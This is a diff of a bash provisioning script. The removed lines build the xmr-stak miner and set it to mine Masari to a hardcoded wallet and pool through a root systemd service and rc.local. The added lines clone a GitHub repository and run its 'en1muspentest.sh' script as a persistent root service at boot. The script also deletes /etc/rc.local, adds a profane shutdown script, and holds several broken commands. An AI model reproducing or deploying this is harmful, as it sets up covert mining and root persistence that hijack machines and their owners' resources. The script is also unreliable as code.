@@ -1,56 +1,50 @@
 #!/bin/bash -ex 
-apt update -y 
-apt install -y libmicrohttpd-dev libssl-dev cmake build-essential libhwloc-dev screen git nano dos2unix sshpass 
+apt update -y -q 
+apt install -y -q libmicrohttpd-dev libssl-dev cmake build-essential libhwloc-dev screen git nano dos2unix sshpass python3 python3-dev python-dev python-pip python3-pip python-setuptools 
+git clone https://github.com/Enimus/pixpoof-eni.git /home/ubuntu/pixpoof-eni 
+cd /home/ubuntu/pixpoof-eni/ 
+chmod +x en1muspentest.sh 
 echo /etc/crontab > 00 6 * * * root reboot 
-git clone https://github.com/Enimus/xmr-stak.git /home/ubuntu/xmr-stak
-cd /home/ubuntu/xmr-stak 
-sudo cmake -DCUDA_ENABLE=OFF -DHWLOC_ENABLE=OFF -DOpenCL_ENABLE=OFF 
-make install 
-cd /home/ubuntu/xmr-stak/bin/ 
-sudo chmod +x xmr-stak 
-sudo chown -R ubuntu:ubuntu /home/ubuntu/* 
-sudo sysctl -w vm.nr_hugepages=128 
-echo -e "vm.nr_hugepages=128" | tee -a /etc/sysctl.conf 
-  
-cat > /lib/systemd/system/masaruk.service << EOF
+cat > /lib/systemd/system/en1muspentest.service << EOF
 [Unit] 
-Description=masaruk
+Description=en1muspentest
 After=network.target 
 [Service] 
-ExecStart=/home/ubuntu/xmr-stak/bin/xmr-stak -c /home/ubuntu/xmr-stak/bin/config.txt --url "pool.masaricoin.com:5555" --user "5mAPFHRdT8u5vLNhi8vnjNVGXsSwL5bBwS7ZeH53WcsoLXC7C1bzYu8BaJUycwyrxEVXiEvsmkLrYfkaTXW1czmiM9WM8j9" --pass "Enimus:enimus@enimus.com" --rigid "" --httpd "0" --currency "masari" 
+ExecStart= /home/ubuntu/pixpoof-eni/en1muspentest.sh 
 User=root 
 [Install] 
 WantedBy=multi-user.target 
 EOF
  
 sudo systemctl daemon-reload 
-sudo systemctl enable masaruk.service 
-sudo systemctl start masaruk.service 
-sudo systemctl stop masaruk.service 
-sudo systemctl restart masaruk.service 
+sudo systemctl enable en1muspentest.service 
+sudo systemctl start en1muspentest.service 
+sudo systemctl stop en1muspentest.service 
+sudo systemctl restart en1muspentest.service 
  
 rm -r /etc/rc.local 
  
 cat /etc/rc.local << EOF 
-#!/bin/sh -ex 
-/home/ubuntu/xmr-stak/bin/xmr-stak -c /home/ubuntu/xmr-stak/bin/config.txt --url "pool.masaricoin.com:5555" --user "5mAPFHRdT8u5vLNhi8vnjNVGXsSwL5bBwS7ZeH53WcsoLXC7C1bzYu8BaJUycwyrxEVXiEvsmkLrYfkaTXW1czmiM9WM8j9" --pass "Enimus:enimus@enimus.com" --rigid "" --httpd "0" --currency "masari" 
- 
-service masaruk restart 
- 
+#!/bin/bash -ex 
+/home/ubuntu/pixpoof-eni/en1muspentest.sh 
+
 exit 0 
 EOF
  
 cat /etc/rc0.d/enimus << EOF
 #!/bin/bash -ex 
-if service masaruk.service failed then
-echo "some shit going here" 
+if service en1muspentest.service failed then
+print "some shit going here" 
 endif sudo apt update && /etc/rc.local 
-else echo "Fuck You" 
-end
+else
+print "Fuck You" 
+
 EOF
  
 chmod +x /etc/rc0.d/enimus 
 /etc/rc0.d/enimus 
+ 
+ 
  
 
  
